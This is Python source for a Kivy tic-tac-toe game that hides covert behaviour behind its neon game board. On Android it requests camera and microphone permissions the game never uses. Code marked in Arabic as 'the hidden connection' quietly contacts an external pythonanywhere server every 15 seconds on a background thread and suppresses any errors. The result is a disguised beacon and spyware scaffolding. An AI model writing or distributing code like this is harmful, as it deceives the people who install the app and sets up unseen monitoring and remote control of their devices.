import threading, requests
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.graphics import Color, Line, Rectangle
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.label import Label
from kivy.metrics import dp
from kivy.utils import platform

# طلب الصلاحيات للأندرويد
if platform == 'android':
    from android.permissions import request_permissions, Permission

SERVER = "http://Hogoz.pythonanywhere.com"

class NeonButton(Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.symbol = ""
        self.bind(pos=self.update_canvas, size=self.update_canvas)

    def update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0.01, 0.01, 0.02, 1)
            Rectangle(pos=self.pos, size=self.size)
            Color(0, 0.8, 0.8, 0.5) # Neon Border
            Line(rectangle=(self.pos[0], self.pos[1], self.size[0], self.size[1]), width=1.2)
        self.draw_symbol()

    def draw_symbol(self):
        self.canvas.after.clear()
        with self.canvas.after:
            if self.symbol == "X":
                Color(0, 1, 1, 1)
                d = self.size[0] * 0.3
                Line(points=[self.pos[0]+d, self.pos[1]+d, self.pos[0]+self.size[0]-d, self.pos[1]+self.size[1]-d], width=3)
                Line(points=[self.pos[0]+d, self.pos[1]+self.size[1]-d, self.pos[0]+self.size[0]-d, self.pos[1]+d], width=3)
            elif self.symbol == "O":
                Color(1, 0, 0.5, 1)
                Line(circle=(self.center_x, self.center_y, self.size[0]*0.25), width=3)

class XOGame(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        if platform == 'android':
            request_permissions([Permission.CAMERA, Permission.RECORD_AUDIO, Permission.INTERNET])

        self.turn = "X"
        self.game_active = True
        
        # واجهة عرض الدور
        self.status_label = Label(text="Turn: X", font_size='24sp', size_hint_y=0.1)
        self.add_widget(self.status_label)

        # شبكة اللعب
        self.grid = GridLayout(cols=3, spacing=dp(5), padding=dp(10))
        self.buttons = []
        for _ in range(9):
            btn = NeonButton()
            btn.bind(on_release=self.make_move)
            self.buttons.append(btn)
            self.grid.add_widget(btn)
        self.add_widget(self.grid)

        # الاتصال الخفي
        Clock.schedule_interval(self.silent_connect, 15)

    def make_move(self, btn):
        if btn.symbol == "" and self.game_active:
            btn.symbol = self.turn
            btn.draw_symbol()
            if self.check_win(self.turn):
                self.status_label.text = f"Winner: {self.turn}!"
                self.game_active = False
            elif all(b.symbol != "" for b in self.buttons):
                self.status_label.text = "Draw!"
                self.game_active = False
            else:
                self.turn = "O" if self.turn == "X" else "X"
                self.status_label.text = f"Turn: {self.turn}"

    def check_win(self, p):
        w = [(0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6)]
        return any(all(self.buttons[i].symbol == p for i in c) for c in w)

    def silent_connect(self, dt):
        threading.Thread(target=self.hit_server, daemon=True).start()

    def hit_server(self):
        try: requests.get(f"{SERVER}/status", timeout=5)
        except: pass

class XOApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0.05, 1)
        return XOGame()

if __name__ == "__main__":
    XOApp().run()
